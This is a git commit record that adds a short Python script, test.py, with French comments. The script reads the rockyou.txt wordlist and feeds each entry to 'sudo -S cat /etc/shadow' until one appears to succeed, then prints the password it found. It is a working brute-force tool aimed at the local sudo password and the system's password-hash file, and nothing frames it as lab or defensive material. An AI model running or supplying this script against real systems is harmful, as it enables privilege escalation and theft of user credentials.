c8b139789898fc5ea7a7da1fe2d0ea2d7f28d3c6
Votre Nom <Vous@exemple.com>
2025-08-27 00:17:30 +0200

    commit

---
+++ test.py
@@ -0,0 +1,43 @@
+import subprocess
+import time
+
+wordlist = "/home/nirvana/Téléchargements/rockyou.txt"
+
+with open(wordlist, "r", encoding="latin-1", errors="ignore") as f:
+    for i, pw in enumerate(f, 1):
+        pw = pw.strip()
+        if not pw:
+            continue
+
+        print(f"[{i}] Test mot de passe: {pw}")
+
+        try:
+            proc = subprocess.Popen(
+                ["sudo", "-S", "cat", "/etc/shadow"],
+                stdin=subprocess.PIPE,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                text=True
+            )
+
+            # Envoie le mot de passe suivi d'un saut de ligne
+            stdout, stderr = proc.communicate(input=pw + "\n", timeout=0.025)
+
+            # Affiche la sortie réelle
+#            print("stdout:", stdout.strip())
+
+            if stdout.strip() != "sudo: il est nécessaire de saisir un mot de passe":
+                print(f"\n✅ Mot de passe trouvé : {pw}")
+                break
+
+        except subprocess.TimeoutExpired:
+            proc.kill()
+        except Exception as e:
+            print(f"Erreur: {e}")
+        finally:
+            proc.terminate()
+            try:
+                proc.wait()
+            except subprocess.TimeoutExpired:
+                proc.kill()
+
